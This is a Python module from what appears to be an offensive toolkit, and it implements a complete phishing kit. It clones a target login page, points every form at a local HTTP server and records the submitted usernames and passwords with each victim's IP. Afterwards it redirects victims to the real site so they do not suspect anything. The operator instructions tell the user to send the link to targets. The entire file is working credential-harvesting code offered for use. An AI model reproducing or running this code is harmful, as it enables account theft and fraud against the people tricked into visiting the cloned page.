"""
modules/phishing.py — Phishing Kit
Clone a target web page, serve it locally, and harvest credentials.
Captured credentials are saved to the mission database.
Uses Python's built-in http.server + BeautifulSoup for cloning.
"""

import os
import re
import time
import threading
import socket
import http.server
import urllib.parse
import questionary
import requests
import urllib3
from bs4 import BeautifulSoup
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from core.ui import draw_header, Q_STYLE
from core.database import db

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()

CLONE_DIR = os.path.join(os.path.dirname(os.path.dirname(__file__)), "clones")
os.makedirs(CLONE_DIR, exist_ok=True)

# ─────────────────────────────────────────────────────────────────────────────
#  CAPTURED CREDENTIALS STORE
# ─────────────────────────────────────────────────────────────────────────────

captured_creds: list = []
creds_lock = threading.Lock()


# ─────────────────────────────────────────────────────────────────────────────
#  PHISHING HTTP SERVER
# ─────────────────────────────────────────────────────────────────────────────

class PhishingHandler(http.server.BaseHTTPRequestHandler):
    serve_dir = CLONE_DIR

    def log_message(self, format, *args):
        pass  # Suppress default access log

    def do_GET(self):
        path = self.path.lstrip("/") or "index.html"
        fpath = os.path.join(self.serve_dir, path)
        if not os.path.exists(fpath):
            fpath = os.path.join(self.serve_dir, "index.html")

        if os.path.exists(fpath):
            with open(fpath, "rb") as f:
                content = f.read()
            self.send_response(200)
            ctype = "text/html" if fpath.endswith(
                ".html") else "application/octet-stream"
            self.send_header("Content-Type", ctype)
            self.end_headers()
            self.wfile.write(content)
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode("utf-8", errors="replace")
        victim = self.client_address[0]
        params = urllib.parse.parse_qs(body)
        flat = {k: v[0] if v else "" for k, v in params.items()}

        console.print(
            f"\n[bold red][!] CREDENTIALS CAPTURED from {victim}:[/bold red]")
        cred_lines = []
        for key, value in flat.items():
            console.print(
                f"  [cyan]{key}[/cyan] = [bold white]{value}[/bold white]")
            cred_lines.append(f"{key}={value}")

        cred_str = " | ".join(cred_lines)
        with creds_lock:
            captured_creds.append({
                "ip":    victim,
                "data":  flat,
                "time":  time.strftime("%H:%M:%S"),
            })

        db.log("Phishing-Kit", victim, f"Credentials: {cred_str}", "CRITICAL")

        # Redirect victim to real site (reduce suspicion)
        self.send_response(302)
        redirect_url = getattr(
            PhishingHandler, 'redirect_url', 'https://google.com')
        self.send_header("Location", redirect_url)
        self.end_headers()


# ─────────────────────────────────────────────────────────────────────────────
#  PAGE CLONER
# ─────────────────────────────────────────────────────────────────────────────

def clone_page(url: str) -> bool:
    """Clone a login page and save to clones/index.html."""
    console.print(f"[*] Cloning: [cyan]{url}[/cyan]")

    try:
        headers = {
            'User-Agent': (
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                'AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36'
            )
        }
        res = requests.get(url, headers=headers, timeout=15,
                           verify=False, allow_redirects=True)
        res.raise_for_status()
    except Exception as e:
        console.print(f"[red][!] Failed to fetch page: {e}[/red]")
        return False

    soup = BeautifulSoup(res.text, "html.parser")

    # Inject credential-harvesting hook into all forms
    for form in soup.find_all("form"):
        form["method"] = "POST"
        form["action"] = "/"  # POST to our server

    # Fix relative asset paths to point to original site
    base_url = re.match(r"(https?://[^/]+)", url).group(1)
    for tag in soup.find_all(["img", "script", "link"]):
        for attr in ["src", "href"]:
            val = tag.get(attr, "")
            if val and not val.startswith("http") and not val.startswith("data:"):
                if val.startswith("/"):
                    tag[attr] = base_url + val
                else:
                    tag[attr] = base_url + "/" + val

    # Add a visible banner for operator awareness
    inject = soup.new_tag("div")
    inject.string = ""  # invisible to target
    if soup.body:
        soup.body.insert(0, inject)

    html = str(soup)
    out_path = os.path.join(CLONE_DIR, "index.html")
    with open(out_path, "w", encoding="utf-8") as f:
        f.write(html)

    console.print(f"[green][+] Page cloned → {out_path}[/green]")
    return True


# ─────────────────────────────────────────────────────────────────────────────
#  PHISHING SESSION
# ─────────────────────────────────────────────────────────────────────────────

def run_phishing():
    draw_header("Phishing Kit — Clone, Serve & Harvest")

    console.print(Panel(
        "[bold white]Phishing Kit Workflow:[/bold white]\n\n"
        "1. Clone a target login page\n"
        "2. Serve it on a local HTTP port\n"
        "3. Trick targets into visiting your IP\n"
        "4. Harvest credentials as they submit the form\n\n"
        "[dim]All captured credentials are saved to the mission database.[/dim]",
        border_style="red"
    ))

    mode = questionary.select(
        "Mode:",
        choices=[
            "1. Clone a URL and serve it",
            "2. Serve existing clones/ directory",
        ],
        style=Q_STYLE
    ).ask()

    if not mode:
        return

    if "Clone" in mode:
        url = questionary.text(
            "Target URL to clone (e.g., https://example.com/login):",
            style=Q_STYLE
        ).ask()
        if not url or not url.startswith("http"):
            console.print("[red][!] Invalid URL.[/red]")
            questionary.press_any_key_to_continue(style=Q_STYLE).ask()
            return

        redirect_url = questionary.text(
            "Redirect victims to (after credential capture):",
            default=url,
            style=Q_STYLE
        ).ask() or url

        if not clone_page(url):
            questionary.press_any_key_to_continue(style=Q_STYLE).ask()
            return

        PhishingHandler.redirect_url = redirect_url
    else:
        if not os.path.exists(os.path.join(CLONE_DIR, "index.html")):
            console.print(
                "[red][!] No index.html found in clones/ — clone a page first.[/red]")
            questionary.press_any_key_to_continue(style=Q_STYLE).ask()
            return
        PhishingHandler.redirect_url = "https://google.com"

    # Port selection
    port_str = questionary.text(
        "Listen port:", default="8080", style=Q_STYLE).ask()
    try:
        port = int(port_str or "8080")
    except ValueError:
        port = 8080

    # Get local IP for display
    try:
        local_ip = socket.gethostbyname(socket.gethostname())
    except Exception:
        local_ip = "127.0.0.1"

    # Start server
    PhishingHandler.serve_dir = CLONE_DIR
    server = http.server.HTTPServer(("0.0.0.0", port), PhishingHandler)
    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
    server_thread.start()

    console.print(Panel(
        f"[bold white]Phishing Server Active[/bold white]\n\n"
        f"[white]URL     :[/white] [bold cyan]http://{local_ip}:{port}[/bold cyan]\n"
        f"[white]Clones  :[/white] {CLONE_DIR}\n"
        f"[white]Redirect:[/white] {PhishingHandler.redirect_url}\n\n"
        "[dim]Send the URL above to your target.\n"
        "Credentials will appear here as they are submitted.\n"
        "Press [bold]Ctrl+C[/bold] to stop the server.[/dim]",
        border_style="red", title="PHISHING ACTIVE"
    ))

    try:
        while True:
            time.sleep(3)
            with creds_lock:
                count = len(captured_creds)
            console.print(
                f"[dim][*] Captured credentials: {count}[/dim]", end="\r")
    except KeyboardInterrupt:
        pass
    finally:
        server.shutdown()
        console.print(f"\n[yellow][*] Server stopped.[/yellow]")

    # Show summary
    with creds_lock:
        total = len(captured_creds)

    if total > 0:
        table = Table(
            title=f"Captured Credentials ({total})", border_style="green", expand=True)
        table.add_column("Time", style="dim")
        table.add_column("Victim IP", style="cyan")
        table.add_column("Data", style="white")
        with creds_lock:
            for c in captured_creds:
                data_str = " | ".join(f"{k}={v}" for k, v in c["data"].items())
                table.add_row(c["time"], c["ip"], data_str)
        console.print(table)
    else:
        console.print(
            "[yellow][-] No credentials captured this session.[/yellow]")

    questionary.press_any_key_to_continue(style=Q_STYLE).ask()


if __name__ == "__main__":
    run_phishing()
